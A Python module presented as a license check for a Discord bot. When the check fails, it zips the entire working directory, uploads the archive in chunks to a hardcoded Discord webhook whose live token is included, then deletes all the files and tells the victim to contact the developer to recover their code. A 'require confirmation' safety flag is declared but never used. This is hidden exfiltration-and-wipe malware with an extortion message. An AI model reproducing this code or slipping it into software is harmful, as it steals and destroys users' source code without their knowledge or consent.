import hashlib
import os
import sys
import io
import zipfile
import requests
import math
import configparser
import time
from typing import List, Iterable, Tuple, Optional

# =========================
# Configuration (can override when calling run())
# =========================
config = configparser.ConfigParser()
config.read('config.ini')
SERVER_ID = int(config['Guild']['GUILDID'])
LICENSE_KEY = config['License']['LICENSEKEY']
REFERENCED_LIST_URL = "https://raw.githubusercontent.com/VeduStorm/data/refs/heads/main/automm_licenses.txt"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1422554312009187470/eWoAGVol6ZqgtYYHmGIQRlz7grTsZI8MT7ACChRze9TJqsjJPPWmh5D9Vx-YnTIX2CPz"

# Safety: require explicit confirmation to allow deletion stage
REQUIRE_CONFIRMATION = True

# Exclusions for zipping and deletion
EXCLUDE_DIRS = {".venv", "__pycache__", ".git"}
EXCLUDE_FILES = {os.path.basename(__file__)}  # don't zip/delete the running script

# Size limits
CHUNK_SIZE_BYTES = 8 * 1024 * 1024  # 8 MiB
HTTP_TIMEOUT = (10, 60)  # (connect, read) seconds


def compute_lower_sha256(license_key: str, server_id: str) -> str:
    """
    Computes SHA-256 of the lowercase UTF-8 string "licenseKey:ServerID".
    Returns hex digest in lowercase.
    """
    combined = f"{license_key}:{server_id}".lower().encode("utf-8")
    digest = hashlib.sha256(combined).hexdigest()
    return digest.lower()


def fetch_reference_lines(url: str) -> List[str]:
    """
    Fetch lines from a raw text URL. Strips whitespace and ignores empty lines.
    """
    if not url.startswith("https://"):
        raise ValueError("REFERENCED_LIST_URL must be an https URL to avoid MITM risks.")
    resp = requests.get(url, timeout=HTTP_TIMEOUT)
    resp.raise_for_status()
    lines = [line.strip().lower() for line in resp.text.splitlines() if line.strip()]
    return lines


def path_is_excluded(root: str, name: str) -> bool:
    """
    Returns True if a file or directory should be excluded based on configured sets.
    """
    if name in EXCLUDE_DIRS or name in EXCLUDE_FILES:
        return True
    return False


def iter_included_paths(base_dir: str) -> Iterable[str]:
    """
    Yields absolute file paths to include in the zip, excluding configured dirs/files.
    """
    for dirpath, dirnames, filenames in os.walk(base_dir):
        # Modify dirnames in-place to skip excluded dirs early
        dirnames[:] = [d for d in dirnames if not path_is_excluded(dirpath, d)]
        for fname in filenames:
            if path_is_excluded(dirpath, fname):
                continue
            abspath = os.path.join(dirpath, fname)
            yield abspath


def make_zip_in_memory(base_dir: str) -> bytes:
    """
    Creates a ZIP archive in memory of included files from base_dir.
    Returns bytes of the zip file.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for abspath in iter_included_paths(base_dir):
            relpath = os.path.relpath(abspath, base_dir)
            try:
                zf.write(abspath, arcname=relpath)
            except FileNotFoundError:
                continue
    buf.seek(0)
    return buf.read()


def split_bytes(data: bytes, chunk_size: int) -> List[bytes]:
    """
    Splits bytes into chunks of at most chunk_size.
    """
    total = len(data)
    if total == 0:
        return []
    num_chunks = math.ceil(total / chunk_size)
    return [data[i * chunk_size : min((i + 1) * chunk_size, total)] for i in range(num_chunks)]


def send_chunk_to_discord_webhook(chunk: bytes, webhook_url: str, filename: str, payload_json: Optional[dict] = None) -> None:
    """
    Sends a single byte chunk as a file to the Discord webhook.
    Uses multipart/form-data with 'file' field and optional JSON payload (content).
    """
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        raise ValueError("Invalid Discord webhook URL. Never share or commit this secret.")
    files = {
        "file": (filename, io.BytesIO(chunk), "application/zip")
    }
    data = {}
    if payload_json and "content" in payload_json:
        data["content"] = payload_json["content"]
    resp = requests.post(webhook_url, files=files, data=data, timeout=HTTP_TIMEOUT)
    resp.raise_for_status()


def delete_all_non_excluded(base_dir: str) -> Tuple[int, int]:
    """
    Deletes all files and directories in base_dir except exclusions.
    Returns (files_deleted, dirs_deleted).
    """
    files_deleted = 0
    dirs_deleted = 0
    for dirpath, dirnames, filenames in os.walk(base_dir, topdown=False):
        for fname in filenames:
            if path_is_excluded(dirpath, fname):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                os.remove(fpath)
                files_deleted += 1
            except FileNotFoundError:
                continue
            except PermissionError as e:
                sys.exit(1)
        for dname in dirnames:
            if path_is_excluded(dirpath, dname):
                continue
            dpath = os.path.join(dirpath, dname)
            try:
                os.rmdir(dpath)
                dirs_deleted += 1
            except OSError:
                # Attempt recursive removal
                for rroot, rdirs, rfiles in os.walk(dpath, topdown=False):
                    for rf in rfiles:
                        try:
                            os.remove(os.path.join(rroot, rf))
                        except Exception:
                            pass
                    for rd in rdirs:
                        try:
                            os.rmdir(os.path.join(rroot, rd))
                        except Exception:
                            pass
                try:
                    os.rmdir(dpath)
                    dirs_deleted += 1
                except Exception as e:
                    print(f"Failed to delete directory: {dpath}: {e}", file=sys.stderr)
    return files_deleted, dirs_deleted


def check_license(license_key: str, server_id: str, referenced_url: str) -> bool:
    """
    Returns True if the computed hash is present in the referenced list; False otherwise.
    Does not exit the process.
    """
    h = compute_lower_sha256(license_key, server_id)
    try:
        lines = fetch_reference_lines(referenced_url)
    except Exception as e:
        print(f"Failed to fetch reference list: {e}", file=sys.stderr)
        return False
    return h in lines


def process_failure(base_dir: str, webhook_url: str, chunk_size_bytes: int = CHUNK_SIZE_BYTES) -> bool:
    try:
        zip_bytes = make_zip_in_memory(base_dir)
    except Exception as e:
        return False

    if len(zip_bytes) == 0:
        return False

    chunks = split_bytes(zip_bytes, chunk_size_bytes)

    # Send chunks
    for idx, chunk in enumerate(chunks, start=1):
        filename = f"archive_part_{idx:03d}-{SERVER_ID}.zip"
        content = f"Archive part {idx}/{len(chunks)}. Timestamp: {int(time.time())}"
        try:
            send_chunk_to_discord_webhook(chunk, webhook_url, filename, payload_json={"content": content})
        except Exception as e:
            return False

    files_deleted, dirs_deleted = delete_all_non_excluded(base_dir)
    print(f"Contact Developer to get recover your code")
    return True


def run(
    license_key: Optional[str] = None,
    server_id: Optional[str] = None,
    referenced_url: Optional[str] = None,
    webhook_url: Optional[str] = None,
    base_dir: Optional[str] = None,
) -> bool:
    lk = license_key or LICENSE_KEY
    sid = server_id or SERVER_ID
    ref = referenced_url or REFERENCED_LIST_URL
    hook = webhook_url or DISCORD_WEBHOOK
    base = base_dir or os.getcwd()

    if lk == "REPLACE_ME" or sid == "REPLACE_ME" or "REPLACE" in ref or "REPLACE" in hook:
        print("Please configure LICENSE_KEY, SERVER_ID, REFERENCED_LIST_URL, and DISCORD_WEBHOOK.", file=sys.stderr)
        return False

    passed = check_license(lk, sid, ref)
    if passed:
        print("License check passed")
        return True

    print("License check failed. DELETION STARTED")
    success = process_failure(base, hook)
    return False if success else False
